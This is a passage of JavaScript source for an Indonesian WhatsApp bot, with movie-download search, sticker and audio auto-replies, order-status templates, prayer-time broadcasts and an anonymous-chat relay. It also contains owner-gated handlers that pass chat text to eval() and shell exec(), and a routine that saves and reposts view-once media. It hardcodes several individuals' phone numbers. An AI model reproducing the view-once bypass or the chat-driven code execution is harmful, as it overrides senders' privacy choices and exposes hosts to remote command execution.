  juna.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  try{
  let anu = await fetchJson(`https://api.zonerweb.biz.id/api/webzone/lk21s?query=${text}&apikey=chiwa`)
  // const foto = anu.result.attributes.coverImage.original
  const judulnya = anu.result.title
  const fotonya = anu.result.image
  const linknya = anu.result.link
  const download = anu.result.downloadLink
  await juna.sendMessage(m.chat, { image: { url: fotonya }, caption: `*Judul:* ${judulnya}\n\n*Baca Sinopsis:* ${linknya}\n\n*Download Film:* ${download}`}, {quoted: m})
  await juna.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
  }catch (error) {
  console.log(error)
  newReply(error)
  }
}
break
// cuddle with pkg

case 'feed':{

let anu = await fetchJson(`https://nekos.life/api/v2/img/feed`)

const url = anu.url

juna.sendStickerFromUrl(m.chat, url, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })


}

break
default:
if ((budy) && ["Assalamualaikum", "assalamualaikum","Assalamu'alaikum",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/salam.mp3')
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Anjay", "anjay",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/anjay.mp3')
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Ajojing"," ajojing",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/ajojing.mp3')
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Bot", "bot",].includes(budy) && !isCmd) {
list = ['./media/sound/oy.mp3','./media/sound/kenapa.mp3','./media/sound/iya.mp3']
random = list[Math.floor(Math.random() * list.length)]
goblok = fs.readFileSync(random)
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["Thx", "Tq", "Terimakasih", "Terima kasih" ,"Makasih",].includes(budy) && !isCmd) {
newReply(`Sama-sama kak ${pushname}`)
}
if ((budy) && ["Asu","Anj","Babi","Kntl","Jancok","Bajingan","Memek","Pantek",].includes(budy) && !isCmd) {
goblok = fs.readFileSync('./media/sound/toxic.mp3')
juna.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
if ((budy) && ["🗿🗿🗿🗿🗿","🗿🗿🗿🗿","🗿🗿","🗿",].
includes(budy) && !isCmd) {
newReply(`🗿`)
}
//chiwa copy dari include
// && 'rama' && 'yori' && 'dian' && 'Miyori' && 'Rama'&& 'Yori' && 'Dian' && 'Made' && 'made'

if (budy.match('yori')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
  juna.sendTextWithMentions(m.chat, `@6285182913498 yoriii kamuuu di omonginn lohh`, m)
}
if (budy.match('dian')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
  juna.sendTextWithMentions(m.chat, `@6285161126317 diaannn kamuuu di omonginn lohh`, m)
  //6285182913498
}
if (budy.match('chiro')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
  juna.sendTextWithMentions(m.chat, `@6282219390496 chirooo kamuuu di omonginn lohh`, m)
}
if (budy.match('Chiro')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
  juna.sendTextWithMentions(m.chat, `@6282219390496 chirooo kamuuu di omonginn lohh`, m)
}
if (budy.match('Yori')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
  juna.sendTextWithMentions(m.chat, `@6285182913498 yoriii kamuuu di omonginn lohh`, m)
}
if (budy.match('Dian')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
  juna.sendTextWithMentions(m.chat, `@6285161126317 diaannn kamuuu di omonginn lohh`, m)
}
if (budy.match('Made')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
}
if (budy.match('made')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
}
if (budy.match('chiwa')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
}
if (budy.match('Chiwa')) {
  let dino = `https://telegra.ph/file/5614bf24d0fc2d0e4c075.png`
  juna.sendStickerFromUrl(m.chat, dino, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
}

if ((budy) && ["proses", "Proses",].includes(budy) && !isCmd) {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!m.quoted) return newReply('Reply pesanan yang akan proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Pending\`\`\`\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!`
const getTextP = getTextSetProses(m.chat, set_proses);
if (getTextP !== undefined) {
var anunya = (getTextP.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
juna.sendTextWithMentions(m.chat, anunya, m)
} else {
juna.sendTextWithMentions(m.chat, (proses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if ((budy) && ['done', "Done"].includes(budy) && !isCmd) {
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!m.quoted) return newReply('Reply pesanan yang telah di proses')
let tek = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : @tanggal\n⌚ JAM : @jam\n✨ STATUS : Berhasil\`\`\`\n\nTerimakasih @user Next Order ya🙏`
const getTextD = getTextSetDone(m.chat, set_done);
if (getTextD !== undefined) {
var anunya = (getTextD.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0]))
juna.sendTextWithMentions(m.chat, anunya, m)
} else {
juna.sendTextWithMentions(m.chat, (sukses.replace('@pesanan', tek ? tek : '-').replace('@user', '@' + m.quoted.sender.split("@")[0]).replace('@jam', time).replace('@tanggal', tanggal(new Date())).replace('@user', '@' + m.quoted.sender.split("@")[0])), m)}
}

if (budy.startsWith('=> ')) {
if (!isCreator) return newReply(mess.OnlyOwner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return newReply(bang)
}
try {
newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
newReply(util.format(e))
}
}

if (budy.startsWith('> ')) {
if (!isCreator) return newReply(mess.OnlyOwner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await newReply(evaled)
} catch (err) {
await newReply(util.format(err))
}
}

if (budy.startsWith('$ ')) {
if (!isCreator) return newReply(mess.OnlyOwner)
exec(budy.slice(2), (err, stdout) => {
if (err) return newReply(`${err}`)
if (stdout) return newReply(stdout)
})
}
if (m.mtype == 'viewOnceMessageV2') {
if (!setting.antiViewOnce) return
let msg = m.message.viewOnceMessageV2.message
 console.log(msg)
let type = Object.keys(msg)[0]
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
 for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
 }
let teks = `「 *ANTI VIEWONCE MESSAGE* 」

📛 *Name* : ${m.pushName}
👤 *User* : @${m.sender.split("@")[0]}
⏰ *Clock* : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB
✍️ *MessageType* : ${m.mtype}
💬 *Caption* : ${m.msg.caption ? m.msg.caption : "no caption"}`

await juna.sendTextWithMentions(m.chat, teks, m)
await delay(500)
if (/video/.test(type)) {
return juna.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
}
else if (/image/.test(type)) {
return juna.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.menfes = this.menfes ? this.menfes : {}
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
find = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
let other = find.a == m.sender ? find.b : find.a
await m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
participant: other
}
} : {})
}
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
return !0
}

}


} catch (err) {
//console.log(err)
m.reply(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
// if (m.isGroup && jam === 4) {


// Credit By ZeeoneOfc
// Recode By JunaaSelebew
// setInterval(function() { 
//   var sekarang = new Date();
//   // Mengekstrak jam dari waktu saat ini
//   var jam = sekarang.getHours();
//   if(jam === 10) {
//     // newReply('Prosess Bosku') 
//     console.log("Limit Sudah Di Reset!")
//   }
//   }, 1000);
//   setInterval(function() { 
//     var sekarang = new Date();
//     // Mengekstrak jam dari waktu saat ini
//     var jam = sekarang.getHours();
//     console.log("Sekarang jam: " + jam);
//     //
//     if(jam === 3) {
//         // newReply('Prosess Bosku') 
//         console.log("Limit Sudah Di Reset!");
//     }
// }, 1000);
// // if(jam === 3)
// // if (m.isGroup)
// // if (jam === 5 && m.isGroup &&(isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
// // console.log("bacod asu")
// //   try {
// //   newReply("Sedang dilakukan maintenace pada bot selama satu jam\nHarap menunggu")
// //   } catch (err) {
// //   //console.log(err);
// //   newReply("Upss error silahkan hubungi owner agar di fix")
// //   //newReply(JSON.stringify(err));
// //   }
// //   }
setInterval(function() {
var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
if(hasilnes === '04:38:00 AM') {
juna.sendMessage("120363069927279039@g.us", {text: `Waktu Subuh Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
}if(hasilnes === '11:55:00 AM') {
juna.sendMessage("120363069927279039@g.us", {text: `Waktu Dzuhur Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
}if(hasilnes === '03:14:00 PM') {
juna.sendMessage("120363069927279039@g.us", {text: `Waktu Ashar Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
}if(hasilnes === '05:55:00 PM') {
juna.sendMessage("120363069927279039@g.us", {text: `Waktu Maghrib Telah Tiba, Ambilah Air Wudhu Dan Segera Sholat Untuk Wilayah Jakarta Dan Sekitarnya`})
}if(hasilnes === '03:51:00 PM') {
juna.sendMessage("120363179591032307@g.us", {text: `TRIGER TELAH TERDETEKSI PADA PUKUL 12:33:00 `})
}
}, 1000);